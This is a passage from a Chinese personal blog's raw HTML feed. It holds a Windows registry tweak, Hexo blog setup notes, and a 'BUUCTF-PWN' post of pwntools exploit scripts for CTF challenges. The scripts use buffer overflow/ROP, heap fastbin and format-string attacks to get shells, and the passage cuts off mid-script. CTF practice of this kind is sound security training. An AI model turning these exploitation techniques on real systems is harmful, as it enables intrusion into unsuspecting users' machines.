title="添加Python文件"></a>添加Python文件</h1><p>和上面方法一样，我这里为</p><p><code>计算机\HKEY_CLASSES_ROOT\PythonFile</code></p><p>将@后的值改为PythonFile</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_CLASSES_ROOT\.py]</span><br><span class="line">@=<span class="string">&quot;PythonFile&quot;</span></span><br><span class="line">[HKEY_CLASSES_ROOT\.py\ShellNew]</span><br><span class="line"><span class="string">&quot;NullFile&quot;</span>=<span class="string">&quot;&quot;</span></span><br><span class="line">[HKEY_CLASSES_ROOT\PythonFile]</span><br><span class="line">@=<span class="string">&quot;_solve&quot;</span></span><br></pre></td></tr></table></figure><h1 id="最后效果"><a href="#最后效果" class="headerlink" title="最后效果"></a>最后效果</h1><p><img src="https://i.loli.net/2021/10/17/NIAKdH2u5nqXzEM.png" alt=""></p>]]></content>
    
    
    <summary type="html">右键增加markdown文件和python文件</summary>
    
    
    
    <category term="随笔" scheme="https://adam-01.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://adam-01.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>博客搭建笔记</title>
    <link href="https://adam-01.github.io/2020/09/21/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/"/>
    <id>https://adam-01.github.io/2020/09/21/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/</id>
    <published>2020-09-21T07:31:06.000Z</published>
    <updated>2021-10-17T07:30:42.966Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ssh-T-git-github-com-报错"><a href="#ssh-T-git-github-com-报错" class="headerlink" title="ssh -T git@github.com 报错"></a>ssh -T <a href="mailto:git@github.com">git@github.com</a> 报错</h2><p><code>git@github.com: Permission denied (publickey).</code></p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git config --global --list</span><br><span class="line">git config --global user.name “yourname”，git config --global user.email “email@email.com”</span><br><span class="line">ssh-keygen -t rsa -C “你的邮箱”</span><br><span class="line">clip &lt; ~&#x2F;.ssh&#x2F;id_rsa.pub #回车后就复制到剪切板了</span><br></pre></td></tr></table></figure><p>到github添加ssh keys的地方直接就能粘贴上</p><p>GitHub—&gt;setting—&gt;SSH and GPG keys—&gt;SSH keys—&gt;new</p><h2 id="使用butterfly主题"><a href="#使用butterfly主题" class="headerlink" title="使用butterfly主题"></a>使用butterfly主题</h2><p><code>git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</code></p><p>更改blog根目录下的_config.yml</p><p>theme: Butterfly</p><p>这个主题不过有点废图， 提供2个自己搜图用的网站</p><p><a href="https://wallroom.io/">https://wallroom.io/</a></p><p><a href="https://www.pexels.com/">https://www.pexels.com/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g -d </span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>访问报错</p><p><code>extends includes/layout.pug block content include ./includes/mixins/post-ui.pug #recent-posts.recent-posts +postUI include includes/pagination.pug</code></p><p>百度解决办法失效：</p><p><code>npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</code></p><p>还是报错。。。</p><p>再安装cheerio 成功解决</p><p><code>npm install cheerio --save</code></p><h3 id="文章上传"><a href="#文章上传" class="headerlink" title="文章上传"></a>文章上传</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  <span class="comment">#清除缓存</span></span><br><span class="line">hexo g <span class="comment">#生成静态文件</span></span><br><span class="line">hexo s <span class="comment">#本地测试</span></span><br><span class="line">hexo d <span class="comment">#上传git</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g -d</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ssh-T-git-github-com-报错&quot;&gt;&lt;a href=&quot;#ssh-T-git-github-com-报错&quot; class=&quot;headerlink&quot; title=&quot;ssh -T git@github.com 报错&quot;&gt;&lt;/a&gt;ssh -T &lt;a href=&quot;</summary>
      
    
    
    
    <category term="随笔" scheme="https://adam-01.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://adam-01.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-PWN</title>
    <link href="https://adam-01.github.io/2020/09/21/BUUCTF-PWN/"/>
    <id>https://adam-01.github.io/2020/09/21/BUUCTF-PWN/</id>
    <published>2020-09-21T07:31:06.000Z</published>
    <updated>2021-11-05T08:36:51.458Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NO-00-pwn1-sctf-2016-solve"><a href="#NO-00-pwn1-sctf-2016-solve" class="headerlink" title="NO.00 pwn1_sctf_2016_solve"></a>NO.00 pwn1_sctf_2016_solve</h1><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28928</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print p.recvuntil(&#x27;Tell me something about yourself: &#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span>*<span class="number">0x14</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p64(<span class="number">0x08048F0D</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-01-warmup-csaw-2016-solve"><a href="#NO-01-warmup-csaw-2016-solve" class="headerlink" title="NO.01 warmup_csaw_2016_solve"></a>NO.01 warmup_csaw_2016_solve</h1><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;node2.buuoj.cn.wetolink.com&quot;</span>,<span class="number">28872</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./warmup_csaw_2016&quot;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400713</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400711</span></span><br><span class="line">bss = <span class="number">0x601058</span> </span><br><span class="line">gets_addr = <span class="number">0x400500</span></span><br><span class="line">sys_addr = <span class="number">0x4004d0</span></span><br><span class="line"><span class="built_in">print</span> io.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> +p64(pop_rdi) + p64(bss) + p64(gets_addr) + p64(pop_rdi)+p64(bss)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-02-babyheap-0ctf-2017-solve"><a href="#NO-02-babyheap-0ctf-2017-solve" class="headerlink" title="NO.02 babyheap_0ctf_2017_solve"></a>NO.02 babyheap_0ctf_2017_solve</h1><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line"></span><br><span class="line">p =process(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p =remote(&#x27;node3.buuoj.cn&#x27;,26914)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(con)))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">    p.sendline(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Allocate(<span class="number">0x60</span>)<span class="comment">#idx=0</span></span><br><span class="line">Allocate(<span class="number">0x30</span>)<span class="comment">#idx=1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">Fill(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">Allocate(<span class="number">0x100</span>)<span class="comment">#idx=2</span></span><br><span class="line"></span><br><span class="line">Fill(<span class="number">2</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Allocate(<span class="number">0x60</span>)<span class="comment">#idx=2</span></span><br><span class="line"></span><br><span class="line">Fill(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">Free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">print</span> Dump(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#print hexDump(1)[:-8]</span></span><br><span class="line">leak = u64(Dump(<span class="number">1</span>)[-<span class="number">25</span>:-<span class="number">17</span>])-<span class="number">0x58</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak:&quot;</span>+<span class="built_in">hex</span>(leak)</span><br><span class="line"></span><br><span class="line">base=leak-<span class="number">0x3c4b20</span></span><br><span class="line">malloc_hook=base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">Fill(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">Allocate(<span class="number">0x60</span>)<span class="comment">#idx</span></span><br><span class="line">Allocate(<span class="number">0x60</span>)<span class="comment">#idx</span></span><br><span class="line">Fill(<span class="number">2</span>,<span class="string">&quot;a&quot;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(base+<span class="number">0x4526a</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">Allocate(<span class="number">0x100</span>)<span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-03-babyfengshui-solve"><a href="#NO-03-babyfengshui-solve" class="headerlink" title="NO.03 babyfengshui_solve"></a>NO.03 babyfengshui_solve</h1><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.198.29.45&#x27;,35423)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26557</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">obj=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,<span class="number">0xf7659750</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>(<span class="params">size,length,text</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Action: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size of description: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;text length: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;text: &#x27;</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Action: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_note</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Action: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_note</span>(<span class="params">idx,length,text</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Action: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;text length: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line">add_note(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;efgh&#x27;</span>)</span><br><span class="line">add_note(<span class="number">0x8</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">0x100</span>,<span class="number">0x19c</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x198</span> + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">display_note(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">free_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line"></span><br><span class="line">system_addr = free_addr - (obj.dump(<span class="string">&#x27;free&#x27;</span>) - obj.dump(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;system_addr 0x%x&quot;</span> % system_addr)</span><br><span class="line">update_note(<span class="number">1</span>,<span class="number">0x4</span>,p32(system_addr))</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="NO-04-第五空间2019决赛-PWN5-solve"><a href="#NO-04-第五空间2019决赛-PWN5-solve" class="headerlink" title="NO.04 第五空间2019决赛]PWN5-solve"></a>NO.04 第五空间2019决赛]PWN5-solve</h1><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./第五空间2019 决赛]PWN5&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27557</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;第五空间2019 决赛]PWN5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#这个方法是将atoi改为system,输入密码时直接传入/bin/sh，if语句中直接得到shell.</span></span><br><span class="line"><span class="string">system_addr = 0x08049080</span></span><br><span class="line"><span class="string">aoti_addr = elf.got[&#x27;atoi&#x27;]</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;your name:&#x27;)</span></span><br><span class="line"><span class="string">payload = fmtstr_payload(offset,&#123;aoti_addr:system_addr&#125;)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;your passwd:&#x27;)</span></span><br><span class="line"><span class="string">p.sendline(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">addr=<span class="number">0x0804C044</span> <span class="comment">#unk_804C044_addr</span></span><br><span class="line"></span><br><span class="line">payload=p32(addr)+p32(addr+<span class="number">1</span>)+p32(addr+<span class="number">2</span>)+p32(addr+<span class="number">3</span>)</span><br><span class="line">payload+=<span class="string">&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span></span><br><span class="line"><span class="comment"># %10$hhn表示向偏移为10处写入的地址空间为1字节</span></span><br><span class="line"><span class="comment"># %$hn表示写入的地址空间为2字节</span></span><br><span class="line"><span class="comment"># %$lln表示写入的地址空间为8字节 </span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;your name:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your passwd:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>)) </span><br><span class="line"><span class="comment">#这里的四个0x10是表示payloa中四个地址的数据长度,32位一个地址占4字节</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-05-第五空间2019决赛-PWN5-solve"><a href="#NO-05-第五空间2019决赛-PWN5-solve" class="headerlink" title="NO.05 第五空间2019决赛_PWN5_solve"></a>NO.05 第五空间2019决赛_PWN5_solve</h1><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./第五空间2019 决赛]PWN5&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27557</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;第五空间2019 决赛]PWN5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#这个方法是将atoi改为system,输入密码时直接传入/bin/sh，if语句中直接得到shell.</span></span><br><span class="line"><span class="string">system_addr = 0x08049080</span></span><br><span class="line"><span class="string">aoti_addr = elf.got[&#x27;atoi&#x27;]</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;your name:&#x27;)</span></span><br><span class="line"><span class="string">payload = fmtstr_payload(offset,&#123;aoti_addr:system_addr&#125;)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;your passwd:&#x27;)</span></span><br><span class="line"><span class="string">p.sendline(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">addr=<span class="number">0x0804C044</span> <span class="comment">#unk_804C044_addr</span></span><br><span class="line"></span><br><span class="line">payload=p32(addr)+p32(addr+<span class="number">1</span>)+p32(addr+<span class="number">2</span>)+p32(addr+<span class="number">3</span>)</span><br><span class="line">payload+=<span 